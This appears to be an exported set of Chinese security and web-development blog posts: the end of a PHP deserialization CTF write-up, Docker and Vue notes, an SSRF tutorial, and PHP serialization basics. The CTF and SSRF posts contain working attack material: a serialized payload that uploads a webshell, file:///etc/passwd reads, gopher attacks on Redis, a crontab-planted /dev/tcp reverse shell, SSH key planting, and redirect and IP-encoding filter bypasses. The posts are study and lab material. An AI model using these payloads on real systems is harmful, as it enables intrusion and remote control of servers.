$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; 代码意思为，当所调用的方法不存在时，会进行下面的操作，结合destruct中的代码，如果我们的checker当时序列化的是profile，在destruct的时候，会调用index()方法，但是这个方法在profile中是不存在的，所以触发call方法，到了call方法后，注意这里：$this-&gt;{$this-&gt;$name}()，此时，$name为之前传入的index，这里$this-&gt;$name变为了调用属性。当调用类中不存在的属性名时，会触发__get()方法，看看代码： 1234public function __get($name) &#123; return $this-&gt;except[$name]; &#125; 会返回except[$name]的值，注意！我们的终极目标是触发img_upload()函数！这里就是突破点，如果我们把except赋值为：$except[index=&gt;’upload_img’]的话，那get函数返回的值为upload_img，在call函数中，就变成了 $this -&gt; upload_img()，就成功触发了upload_img函数。 payload下面我们来梳理一下payload。 12345678910111213141516171819202122232425262728&lt;?phpnamespace app\\web\\controller;class Profile &#123; //绕过登录判断 public $checker=0; public $filename_tmp=&quot;../public/upload/1.png&quot;; public $filename=&quot;../public/upload/fxxy.php&quot;; public $upload_menu; //绕过文件后缀名判断 public $ext=1; public $img; //触发upload_img() public $except=array(&#x27;index&#x27;=&gt;&#x27;upload_img&#x27;);&#125;class Register &#123; public $checker; public $registed=0;&#125;$a=new Register();$a-&gt;checker=new Profile();$a-&gt;checker-&gt;checker = 0;// echo serialize($a);echo base64_encode(serialize($a));?&gt; 然后用生成的payload替换我们的cookie 可以看到文件名已经改了 蚁🗡连接，getshell。 收获 对于POP链的构造加深了理解，找到反序列化点后，一般先全局搜索相关的魔法函数，看这些函数能否通过相关的手段串联起来达到我们最终的目的 PHP的namespace理解。https://www.runoob.com/w3cnote/php-namespace-intro.html","categories":[],"tags":[]},{"title":"docker学习笔记","slug":"docker笔记","date":"2019-10-29T16:00:00.000Z","updated":"2021-10-22T08:30:23.009Z","comments":true,"path":"2019/10/30/docker笔记/","link":"","permalink":"http://example.com/2019/10/30/docker%E7%AC%94%E8%AE%B0/","excerpt":"为什么要学docker？因为搭环境太累了！！","text":"为什么要学docker？因为搭环境太累了！！ 首先明确docker是什么： 是一个用于开发，交付和运行应用程序的开放平台。Docker 使您能够将应用程序与基础架构分开，从而可以快速交付软件。 说白了，就是一个集成环境，里面包含你需要的应用和相应配置 优点： 快速，一致地交付您的应用程序。 响应式部署和扩展。Docker 是基于容器的平台，允许高度可移植的工作负载。Docker 容器可以在开发人员的本机上，数据中心的物理或虚拟机上，云服务上或混合环境中运行。 也就是说，随时随地轻松启动。 在同一硬件上运行更多工作负载。Docker 轻巧快速。它为基于虚拟机管理程序的虚拟机提供了可行、经济、高效的替代方案，因此您可以利用更多的计算能力来实现业务目标。 翻译成白话就是：轻量、内存消耗较小 本文以安装redis环境为例 安装Docker环境 Ubuntu：18.04.2 先把源更新为阿里源1$ vim /etc/apt/sources.list 将文件中的内容全部注释掉，新增以下内容 12345678910deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable# deb-src [arch=amd64] https://download.docker.com/linux/ubuntu bionic stabledeb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic stable# deb-src [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic stable# deb-src [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic stable 多说一个坑，如果上述注释的内容没有注释的话，会报错 意思就是这个源没有了，但是可能就会陷入一个误区，这个源没有了，那我的软件就装不了了，其实不是，这只是一个源除了问题，将这个出错的源remove后，其余的源会自动再次帮我们寻找我们想要的软件，命令如下 1sudo add-apt-repository --remove aliyun:/docker-engine/apt/repo 相关remove后面的参数，根据自己的报错信息更改，我的是：http://mirrors.aliyun.com/docker-engine/apt/repo，按照相应格式进行替换：源名:出错仓库 安装证书1sudo apt-get install apt-transport-https ca-certificates curl software-properties-common 安装docker官方公钥12root@fxxy-virtual-machine:/# curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -OK 检测是否安装成功 12345root@fxxy-virtual-machine:/# sudo apt-key fingerprint 0EBFCD88pub rsa4096 2017-02-22 [SCEA] 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88uid [ 未知 ] Docker Release (CE deb) &lt;docker@docker.com&gt;sub rsa4096 2017-02-22 [S] 安装docker1sudo apt-get -y install docker-ce 检测安装成功1sudo docker run hello-world 安装成功会输出以下内容 123456789101112131415161718192021222324252627root@fxxy-virtual-machine:/# sudo docker run hello-worldUnable to find image &#x27;hello-world:latest&#x27; locallylatest: Pulling from library/hello-world0e03bdcc26d7: Pull complete Digest: sha256:d58e752213a51785838f9eed2b7a498ffa1cb3aa7f946dda11af39286c3db9a9Status: Downloaded newer image for hello-world:latestHello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bashShare images, automate workflows, and more with a free Docker ID: https://hub.docker.com/For more examples and ideas, visit: https://docs.docker.com/get-started/ 安装redis拉取1docker pull redis:latest 查看安装1docker images 映射服务1docker run -itd --name redis-test -p 6379:6379 redis -p 6379:6379：将redis的6379端口映射到宿主机的6379端口，可以直接通过访问宿主机的IP来访问redis服务 查看运行1docker ps 可以看到运行的docker服务中出现redis 访问服务1docker exec -it redis-test /bin/bash 这段命令的作用： exec：在运行的容器中执行命令 -it：进入容器的终端并获得输入 那合起来就是，使用redies-test这个容器，并分配一个伪终端给到我们 用redis-cli登录redis服务 退出当前容器快捷键为ctrl-D。","categories":[],"tags":[{"name":"docker,环境搭建","slug":"docker-环境搭建","permalink":"http://example.com/tags/docker-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"vue 基础指令学习","slug":"vue基础指令","date":"2019-10-26T16:00:00.000Z","updated":"2021-10-22T08:32:51.653Z","comments":true,"path":"2019/10/27/vue基础指令/","link":"","permalink":"http://example.com/2019/10/27/vue%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/","excerpt":"…..","text":"….. 显示数据html 123&lt;div id=&quot;app&quot;&gt; &#123;&#123; message &#125;&#125; &lt;/div&gt; js 12345678new Vue( &#123; el: &#x27;#app&#x27;, data:&#123; message:&#x27;hello vue&#x27; &#125; &#125;) v-html 对绑定的属性进行html渲染 123&lt;div id=&quot;app&quot;&gt; &lt;div v-html=&quot;message&quot;&gt;&lt;/div&gt;&lt;/div&gt; js 123456new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; message: &#x27;&lt;h1&gt;fxxy&lt;/h1&gt;&#x27; &#125;&#125;) v-html &amp; v-text v-html会对绑定的属性进行渲染，如果内容中有html标签，则在页面中不会出现，而v-text则不会进行渲染，如果内容中有html标签，则会以源码显示 v-on 为html中的元素绑定事件，监听 DOM 事件，触发methods,缩写为@ 1234&lt;div id=&quot;app5&quot;&gt; &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;button v-on:click=&quot;reverseMessage&quot;&gt; 逆转消息 &lt;/button&gt; &lt;/div&gt; js 12345678910111213new Vue( &#123; el:&#x27;#app5&#x27;, data:&#123; message:&#x27;张峻山是猪！&#x27; &#125;, methods:&#123; reverseMessage:function()&#123; this.message = this.message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125; &#125; &#125;); v-bind 为html中的元素绑定data属性，v-bind 指令被用来响应地更新 HTML 属性，缩写为 : html 12345678&lt;div id=&quot;app2&quot;&gt; &lt;span v-bind:title=&quot;date&quot;&gt; 鼠标悬停几秒钟查看此处动态绑定的提示信息！ &lt;/span&gt; &lt;a v-bind:href=&quot;url&quot;&gt;&lt;/a&gt; &lt;a :target=&quot;url&quot;&gt;&lt;/a&gt; &lt;/div&gt; js 12345678910new Vue ( &#123; el:&#x27;#app2&#x27;, data:&#123; date:&#x27;页面加载与&#x27; + new Date().toLocaleString(), url:&#x27;www.google.com&#x27;, target:&#x27;_blank&#x27; &#125; &#125;); v-if 、v-else 、v-else-ifhtml 1234567891011121314&lt;div id=&quot;app3&quot;&gt; &lt;div v-if=&quot;type === A&quot;&gt; A &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;B&#x27;&quot;&gt; B &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;C&#x27;&quot;&gt; C &lt;/div&gt; &lt;div v-else&gt; Not A/B/C &lt;/div&gt;&lt;/div&gt; js 12345678new Vue( &#123; el:&#x27;#app3&#x27;, data:&#123; type:&#x27;A&#x27;, &#125; &#125;); v-show123&lt;div id=&quot;app&quot;&gt; &lt;h1 v-show=&quot;ok&quot;&gt;Hello!&lt;/h1&gt;&lt;/div&gt; js 123456new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; ok: true &#125;&#125;) v-if 和v-show的区别 v-if 是动态添加，当值为 false 时，是完全移除该元素，即 dom 树中不存在该元素。 v-show 仅是隐藏 / 显示，值为 false 时，该元素依旧存在于 dom 树中。若其原有样式设置了 display: none 则会导致其无法正常显示。 如果需要频繁切换 v-show 较好，如果在运行时条件不大可能改变 v-if 较好。 v-forhtml 1234567&lt;div id=&quot;app4&quot;&gt; &lt;ul&gt; &lt;li v-for = &#x27;todo in todos&#x27;&gt; &#123;&#123;todo.text&#125;&#125; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; js 123456789101112new Vue( &#123; el:&#x27;#app4&#x27;, data:&#123; todos:[ &#123;text:&quot;zjs is a pig&quot;&#125;, &#123;text:&quot;zjs is a big pig&quot;&#125;, ] &#125; &#125;); v-model 实现双向数据绑定 12345&lt;div id=&quot;app6&quot;&gt; &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;input v-model=&quot;message&quot;&gt; &lt;/div&gt; js 12345&lt;div id=&quot;app6&quot;&gt; &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;input v-model=&quot;message&quot;&gt; &lt;/div&gt; ref12&lt;input type=&quot;text&quot; ref=&quot;name&quot; v-on:keyup=&quot;logName&quot;&gt;this.name=this.$refs.name.value","categories":[],"tags":[]},{"title":"SSRF-服务端请求伪造","slug":"SSRF","date":"2019-09-25T16:00:00.000Z","updated":"2021-10-22T08:31:18.354Z","comments":true,"path":"2019/09/26/SSRF/","link":"","permalink":"http://example.com/2019/09/26/SSRF/","excerpt":"SSRF：服务端请求伪造漏洞 原理：由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用在外网探测或攻击内网服务。漏洞大多数发生在连接外网与内网的跳板机中 成因：服务器未对发起请求的URL进行有效检测和过滤。 哪些地方容易出现SSRF： 网站的分享功能 在线翻译，通过URL地址进行翻译 PC到手机的转码服务（通过url把原网址内容转成适合手机阅读的情况） 图片文章的加载、下载、收藏 ……..","text":"SSRF：服务端请求伪造漏洞 原理：由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用在外网探测或攻击内网服务。漏洞大多数发生在连接外网与内网的跳板机中 成因：服务器未对发起请求的URL进行有效检测和过滤。 哪些地方容易出现SSRF： 网站的分享功能 在线翻译，通过URL地址进行翻译 PC到手机的转码服务（通过url把原网址内容转成适合手机阅读的情况） 图片文章的加载、下载、收藏 …….. 相关函数以下代码demo，都未对会发起请求的URL参数进行过滤检测而服务器直接进行请求 get_file_content() 12345678910&lt;?phpif (isset($_POST[&#x27;url&#x27;])) &#123; $content = file_get_contents($_POST[&#x27;url&#x27;]); $filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;; file_put_contents($filename, $content); echo $_POST[&#x27;url&#x27;]; $img = &quot;&lt;img src=\\&quot;&quot;.$filename.&quot;\\&quot;/&gt;&quot;; &#125;echo $img;?&gt; fsockopen() 1234567891011121314151617181920&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo &quot;$errstr (error number $errno) \\n&quot;; &#125; else &#123; $out = &quot;GET $link HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: $host\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; $out .= &quot;\\r\\n&quot;; fwrite($fp, $out); $contents=&#x27;&#x27;; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt; curl_exec() 123456789101112131415&lt;?php if (isset($_POST[&#x27;url&#x27;])) &#123; $link = $_POST[&#x27;url&#x27;]; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($curlobj); curl_close($curlobj); $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;; file_put_contents($filename, $result); echo $result;&#125;?&gt; 相关协议gophergopher协议，最早出现在tcp ip协议之前，可以用它来向指定的地址和端口发送GET、POST请求 格式 1gopher://&lt;host&gt;:&lt;port&gt;/_ + TCP/IP数据 默认端口：70。如果在使用gopher协议时未指定相关的端口，则默认发送到主机地址的70端口 实践 在test.php中写入 12345&lt;?php$a = $_GET[&#x27;test&#x27;];echo $a;?&gt; 用burp抓取一个流量包后，将内容进行url编码 然后打开终端，输入命令 1curl gooher://127.0.0.1:80/_数据包编码后的内容 然后页面进行相应输出，如果要传POST包，则将包进行相应编码则可 dict dict是基于查询响应的TCP协议。 默认端口：2628 格式： 1dict://&lt;host&gt;:&lt;port&gt; 实践 端口探测：对80、22、3306进行探测 file 计算机本地的file协议，可以查看相应的文件，file的路径需是绝对路径 实践 1curl file:///etc/passwd SSRF本地实践在ssrf.php中，写入一段广为流传的可以造成SSRF漏洞的代码 1234567891011121314151617function curl($curl)&#123; // 初始化一个新cURL资源 $ch = curl_init(); // 设置URL和相应的选项,将对应的值赋给$ch句柄 curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_HEADER,0); //执行 curl_exec($ch); //关闭资源 curl_close($ch);&#125;$curl = $_GET[&#x27;url&#x27;];curl($curl); 此段函数的主要功能就是获取get参数中的url的值，然后通过curl_exec()执行相应的会话，此函数应该在参数$ch被初始化并设置相应的选项后才能被调用。 下面我们分别通过gopher、dict、file协议对主机进行相应的攻击 利用方式 12345678//filecurl http://127.0.0.1?url=file:///etc/passwd//dictcurl http://127.0.0.1?url=dict://127.0.0.1:3306/info//gopher 探测redis端口curl http://127.0.0.1?url=gopher://127.0.0.1:6379/_payload SSRF redis未授权首先明确一个东西，什么是redis？redis就是一个数据库，用C语言编写，相较于mssql、mysql这些数据库，redis支持存储的数据类型更多，支持的数据操作也更多。 为什么会有redis未授权访问漏洞呢？ 因为redis在安装时，默认情况下是将服务绑定在服务器的0.0.0.0:6379端口下（如果配置人员不做更改的话），这样会将redis服务暴露在公网上，如果在未开启认证的情况下，会导致任意用户访问redis服务器，并读取redis数据库中的数据信息。还可以利用相关redis方法，向redis数据库中写入公钥，进而获得私钥登录目标服务器。 实践一 受害机环境说明：ubuntu虚拟机下装了docker的环境，并将docker的6379端口映射到Ubuntu的6379端口上，ip：192.168.128.138 攻击机环境：kali 首先用nmap探测以下6379端口 1nmap -A -p 6379 -script redis-info 192.168.128.138 可以得到redis的相关信息。 用kali的本地redis服务访问redis服务器。 查看key信息 12keys *get key 本地生成一个ssh密钥 12ssh-keygen -t rsa //生成密钥(echo -e &quot;\\n\\n&quot;;cat /root/.ssh/id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; key.txt //将密钥内容写入key.txt,\\n换行的原因时避免与redis数据库缓冲区中的其他数据混合 上传到目标服务器 1cat /key.txt | /usr/bin/redis-cli -h 192.168.128.138 -x set xxx //-x参数的作用是：表示将标准输入的内容作为最后一个参数的内容，这段命令的作用是将key.txt的内容作为xxx键的值 最后在攻击机用用ssh登录。(一般实际情况这种理想情况很少见) 实践二实践2用P师傅的一个docker环境，weblogic-ssrf，安装略过，地址：https://vulhub.org/#/environments/weblogic/ssrf/ weblogic机器IP：172.18.0.3 redis机器IP：172.18.0.2 首先来到存在漏洞的页面： ·http://172.10.0.2:7001/uddiexplorer/SearchPublicRegistries.jsp。 用burp抓一个包，关注operator这个参数，可以看到是一个网址，我们输入http://127.0.0.1:7001发送看看 发送后，页面回复了一个错误，7001这个端口是weblogic的默认端口，返回的是404状态码，这说明什么，说明7001端口可以访问，但是没有找到我们想要的资源 端口改为80和9999，返回的是could not connect，说明这个端口是不可访问的 现在梳理一下两个状态 可访问：返回相关状态码 不可访问：返回不可连接 下面我们来探测一下redis服务。redis的默认端口为6379，我们把url修改为redis服务器的地址和端口：http://172.18.0.2:6379 说明6379端口是开放的，把下面的命令url编码一下发送过去 1234set 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\\n\\n\\n\\n&quot; config set dir /etc/config set dbfilename crontabsave 第一句：一个非常经典的tcp下反弹shell的命令，要在命令前后多增加几行换行符，这样以便将命令与redis存入的脏数据分隔开 第二条：将redis的存储路径设置为/etc 第三条：存储文件名设置为drontab，也就是设置为一个定时任务 第四条：保存 可以看到成功反弹了一个shell SSRF 30x 跳转原理：当请求的URL存在30x跳转时，浏览器会继续请求设定好的URL demo漏洞页面，存在远程服务器上 1234567891011121314151617&lt;?php function curl($url)&#123; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);//设定重定向 //限制协议为http/https curl_setopt($ch,CURLOPT_PROTOCOLS,CURLPROTO_HTTP|CURLPROTO_HTTPS); curl_setopt($ch,CURLOPT_HEADER,0); curl_exec($ch); curl_close($ch); &#125; $url = $_GET[&#x27;url&#x27;]; ?&gt; 构造的302.php，并将此脚本放在一个公网IP上，确保目标服务器可以请求到 1234567891011121314&lt;?php $protocol = $_GET[&#x27;s&#x27;]; $ip = $_GET[&#x27;i&#x27;]; $port = $_GET[&#x27;p&#x27;]; $query = $_GET[&#x27;q&#x27;]; if(empty($port))&#123; header(&quot;Location:$protocol://$ip/$query&quot;); &#125; else&#123; header(&quot;Location:$protocol://$ip:$port/$query&quot;); &#125;?&gt; 说明 目标服务器：test.com 存放脚本的公网IP：120.25.65.12 利用payload（%26是&amp;的URL编码，避免浏览器将参数解析成ssrf.php的参数） 1234567891011# dict 协议探测 dict://127.0.0.1:6379curl -v http://test.com/ssrf.php?url=http://120.25.65.12/302.php?s=dict%26i=127.0.0.1%26p=6379%26q=info# file协议 文件读取 file:///etc/passwdcurl -v http://test.com/ssrf.php?url=http://120.25.65.12/302.php?s=file%26i=/etc/passwd# gopher协议攻击redis反弹shell gopher://127.0.0.1:6379/_相关反弹shell的payloadcurl -v http://test.com/ssrf.php?url=http://10.25.65.12/302.php?s=gopher%26i=127.0.0.1%26p=3679%26q=_相关反弹shell的payload SSRF DNS重绑定首先来了解两个基本概念 DNS服务器： 计算机域名服务器。是一个将域名和IP地址相互映射的一个分布式数据库。 域名解析： 将一个域名解析到一个IP地址，让人们可以通过访问这个域名来访问到这个IP。 A记录：将域名指向一个Ipv4地址 AAAA记录：将域名指向一个iPv6地址 C记录：将一个域名1指向域名2，则域名1也可以通过域名2来进行访问 MIX：将域名指向一个邮箱服务器 ….. TTL 生存时间。表示DNS记录在DNS服务器上缓存时间。也就是说当一个DNS服务器成功解析一个域名后，这个解析记录在此台DNS服务器上保存的时间，超过这个时间，该记录就会被销毁，再次请求时，会重新进行查找解析。 DNS重绑定主要利用的是可以设置域名解析的缓存时长TTL，下图是一个网站请求URL的步骤 (图源网络) 我们的利用点主要在红色框框圈出来的这部分时间内 v 由上面的知识我们可以知道，一个域名的解析记录缓存时间可以设置，由图我们可以知道，服务器的相关执行顺序： 先从DNS服务器解析，获得URL的IP地址 将获取的IP地址与预先设定的规则进行匹配，判断是否符合请求条件 如果符合条件则进行请求 我们可以在第一步和第三步做文章，思路如下 在服务器第一次请求DNS服务器获取IP时，也就是要获得url的IP进行判断之前，我们将域名的IP解析到一个合理的公网IP1上，然后将TTL设置成0； 服务器进行判断后，认为这个IP符合正常条件，则进入下一步请求内容，我们利用的就是服务器判断的这个间隙，在这个间隙之间，如果我们将网址解析到127.0.0.1的话，那么服务器后续再进行请求时，如果没有使用第一步请求的IP，而是直接用域名去请求内容的话，那就可能请求到内网的一些信息。 但是这个要求比较高，不同的DNS服务器有相应的TTL限制，比如阿里云默认10min，国外0。 https://xz.aliyun.com/t/7495 这里留个坑后面补，学写DNS解析服务器 总结漏洞成因 服务器端提供了向其他服务器请求资源获取数据的权限但未对请求的目标地址做有效的过滤。 绕过方式 302绕过 构造302跳转php IP编码绕过 hex编码 123456789127.0.0.1# 十六进制0x7f.0x0.0x0.0x1# 八进制0177.0.0.01#混合编码0177.0.0.0x1 xip.io绕过：http://xip.io/ 协议绕过 gopher file dict等 DNS重绑定 要求服务器对资源的请求直接使用curl(用户输入的网址)，而不是沿用进行判断时使用的IP 防御 针对存在url操作的点进行相关过滤、判断 url白名单 禁止30x跳转 referhttps://joychou.org/web/phpssrf.html https://k-ring.github.io/2019/05/31/对万金油gopher协议的理解与应用/ https://www.smi1e.top/gopher-ssrf攻击内网应用复现/ https://damit5.com/2018/05/26/SSRF-漏洞学习/ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf?tdsourcetag=s_pctim_aiomsg https://www.anquanke.com/post/id/86527 https://xz.aliyun.com/t/7495 http://blog.leanote.com/post/snowming/e2c24cf057a4 https://ctf-wiki.github.io/ctf-wiki/web/ssrf-zh/","categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"PHP反序列化","slug":"PHP反序列化","date":"2019-09-17T16:00:00.000Z","updated":"2021-10-22T08:31:03.807Z","comments":true,"path":"2019/09/18/PHP反序列化/","link":"","permalink":"http://example.com/2019/09/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"序列化与反序列化 序列化：在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。就是将数组和类的值转换成字符串来传递。 反序列化：将已经序列化的对象/数组的字符串还原成对象/数组格式。 为什么要序列化？有利于存储或传递 PHP 的值，同时不丢失其类型和结构。","text":"序列化与反序列化 序列化：在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。就是将数组和类的值转换成字符串来传递。 反序列化：将已经序列化的对象/数组的字符串还原成对象/数组格式。 为什么要序列化？有利于存储或传递 PHP 的值，同时不丢失其类型和结构。 相关函数serialize： 语法格式：serialize ( mixed $value ) 作用：返回一个字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 栗子1 在test.php中，写段代码把php中常用的类型都序列化一下： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php class test&#123; var $name; var $age; function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; &#125; &#125; $test1 = new test(&#x27;user&#x27;,20); echo(&quot;类序列化之前数值类型：&quot;.gettype($test1).&quot;&lt;br&gt;&quot;); $testSerialize = serialize($test1); echo($testSerialize); echo(&#x27;&lt;br&gt;&#x27;); echo(&quot;类序列化之后数值类型：&quot;.gettype($testSerialize).&quot;&lt;br&gt;&quot;); $arr = array(); $arr[&#x27;phone&#x27;] = 123456; $arr[&#x27;address&#x27;] = &quot;Beijing&quot;; echo(&quot;数组序列化之后数值类型：&quot;.gettype($arr).&quot;&lt;br&gt;&quot;); $arrSerialize = serialize($arr); echo(&quot;数组序列化之后：&quot;.$arrSerialize.&quot;&lt;br&gt;&quot;); $number = 1; echo(&quot;int 序列化之后：&quot;.serialize($number).&quot;&lt;br&gt;&quot;); $str = &quot;asdfgh&quot;; echo(&quot;string 序列化后：&quot;.serialize($str))?&gt; 来看看浏览器的输出： O:4:”test”:2:{s:4:”name”;s:4:”user”;s:3:”age”;i:20;} 这串字符串代表什么？ 先来看大括号外面的部分： O:4:&quot;test&quot;:2：O表示这是一个object类型，4表示初始化的这个类名的长度为4，test为序列化的类名（注意这里不是你传入的变量名，而是你最初初始化的那个类的类名），2表示这个对象中的变量个数 再来看大括号里面的部分： &#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;：分成两部分看，用中间分号间隔s:4:&quot;name&quot;;：表示第一个变量名为name，长度为4，类型为strings:4:&quot;user&quot;;：紧跟在name变量的序列化后面，表示name这个变量的值为users:3:&quot;age&quot;;i:20;：第二个变量名为age，变量名长度为3，变量名为string类型；变量的值为20，为int类型 其余的输出以此方式类推，可见，当用serialize函数序列化一个值后，会记录该对象的名称，名称长度，包含的变量个数及变量详情等内容。 注意：由于serialize()函数序列化的是对应的定义的类，所以当一个对象在创建时，如果没有对类中的所有变量进行赋值，在序列化该对象的时候，实际是序列化的定义的类。 栗子2 如在test类中新增flag变量，但是在创建对象时不对他进行赋值， 12345678910111213141516171819class test&#123; var $name; var $age; var $flag; function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;flag = $flag; &#125; &#125; $test1 = new test(&#x27;user&#x27;,20); echo(&#x27;&lt;br&gt;&#x27;); echo(serialize($test1)); 在序列化的时候会是下面这样： 在值得那里会描述为N，即null的缩写。 总结 可传入的数值类型：object、number、array、string等 序列化后的格式：参见上文 unserialize： 格式：unserialize ( string $str ) 返回值：返回的是转换之后的值，可为int、string、array、object等 如果传递的字符串不可解序列化，则返回 **FALSE**，并产生一个 **E_NOTICE**。 作用：对传入的string进行操作，将其转换为相应的php结构并返回 栗子3 123456789101112131415161718192021222324&lt;?php class test&#123; var $name; var $age; //var $flag; function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; //$this-&gt;flag = $flag; &#125; &#125; $test1 = new test(&#x27;user&#x27;,20); $value_class = &#x27;O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;; echo(&#x27;反序列化之前数值为：O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;); echo(&#x27;&lt;br&gt;&#x27;); var_dump(unserialize($value_class));?&gt; 可以看到： 反序列化之后，变成了object。 栗子4 我们更改一些代码：在类中增加变量flag，但是在序列化的字符串中不增加相关内容： 12345678910111213141516171819202122class test&#123; var $name; var $age; var $flag;//增加的字段 function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;flag = $flag; &#125; &#125; $test1 = new test(&#x27;user&#x27;,20); $value_class = &#x27;O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;; //未增加相应内容 echo(&#x27;反序列化之前数值为：O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;); echo(&#x27;&lt;br&gt;&#x27;); var_dump(unserialize($value_class)); //$testSerialize = serialize($test1); 输出： 在反序列化后的对象中，多了一个字段flag，值为null； 如果在字符串中增加相关内容，但是定义的类中没有相关变量会怎么样？ 1234567891011121314151617181920class test&#123; var $name; var $age; function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;flag = $flag; &#125; &#125; $test1 = new test(&#x27;user&#x27;,20); $value_class = &#x27;O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;flag&quot;;s:4:&quot;asdf&quot;;&#125;&#x27;; //未增加相应内容 echo(&#x27;反序列化之前数值为：O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;); echo(&#x27;&lt;br&gt;&#x27;); var_dump(unserialize($value_class)); 此时，会返回一个布尔类型的false。 总结所以，总结一下，unserilize要成功反序列化一个字符串的条件有以下： 字符串的格式严格按照序列化的格式，否则会返回false 在反序列化的类中，包含字符串中的所有变量，否则返回false 处理该字符串的php文件中，应包含该类的定义（该php文件内有定义/包含的文件中有定义） 魔法函数https://www.php.net/manual/zh/language.oop5.magic.php __construct(): 允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 也就是说，当代码中出现new关键字实例化一个对象时，会触发该函数 __destruct(): 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 也就是说，在结束创建，不再使用该对象时，会触发该函数 栗子5 1234567891011121314class fxxy&#123; var $name = &quot;fxxy&quot;; function __construct()&#123; echo &quot;this is __construct()&quot;; $this-&gt;name = &quot;fxxy&quot;; &#125; function __destruct()&#123; echo &quot;this is __destruct&quot;; &#125; &#125; $test = new fxxy(); echo(&#x27;&lt;br&gt;&#x27;.$test-&gt;name.&#x27;&lt;br&gt;&#x27;); 输出： 可以看到，在页面中不会再使用到test这个对象后，系统自动调用了__destruct函数 